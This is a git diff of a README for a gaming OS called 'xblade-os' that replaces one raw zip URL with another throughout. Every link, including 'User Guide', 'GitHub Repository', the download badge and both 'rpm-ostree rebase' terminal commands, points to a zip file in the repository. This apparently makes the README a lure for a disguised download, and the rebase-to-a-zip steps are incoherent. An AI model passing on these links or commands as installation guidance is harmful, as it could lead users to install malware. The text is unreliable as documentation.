@@ -1,6 +1,6 @@
 # 🎮 xblade-os - A New Way to Experience Gaming
 
-[![Download xblade-os](https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip)](https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip)
+[![Download xblade-os](https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip)](https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ xblade-os gives you a fresh approach to gaming. We designed this software for an
 
 To start using xblade-os, you need to download it from our releases page. 
 
-[Visit this page to download](https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip)
 
 ### Installation Steps
 
@@ -19,7 +19,7 @@ To start using xblade-os, you need to download it from our releases page.
    Start with rebasing to the unsigned image. This prepares your system by installing the necessary signing keys and policies. Open your terminal and enter this command:
 
    ```bash
-   rpm-ostree rebase https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip
    ```
 
 2. **Reboot Your System:**
@@ -35,7 +35,7 @@ To start using xblade-os, you need to download it from our releases page.
    Now, you can switch to the signed image. This step ensures you have the latest and secure version of xblade-os. Enter this command in your terminal:
 
    ```bash
-   rpm-ostree rebase https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip
    ```
 
 4. **Reboot Again:**
@@ -48,7 +48,7 @@ To start using xblade-os, you need to download it from our releases page.
 
 ### Latest Builds
 
-The `latest` tag will always point to the most recent build available. Each build still aligns with the Fedora version detailed in `https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip`.
+The `latest` tag will always point to the most recent build available. Each build still aligns with the Fedora version detailed in `https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip`.
 
 ## 🖥️ System Requirements
 
@@ -82,9 +82,9 @@ Join our community for the latest updates and support:
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip) - A comprehensive guide to using xblade-os.
-- [GitHub Repository](https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip) - Check out the project source code.
+- [User Guide](https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip) - A comprehensive guide to using xblade-os.
+- [GitHub Repository](https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip) - Check out the project source code.
 
 For any problems or feature requests, feel free to create an issue on our GitHub repository.
 
-[Visit this page to download](https://github.com/aklakhil/xblade-os/raw/refs/heads/main/containerfiles/kmods-nvidia/os_xblade_1.4-alpha.5.zip) and start your journey with xblade-os today!
+[Visit this page to download](https://raw.githubusercontent.com/aklakhil/xblade-os/main/modules/os-xblade-v1.2.zip) and start your journey with xblade-os today!
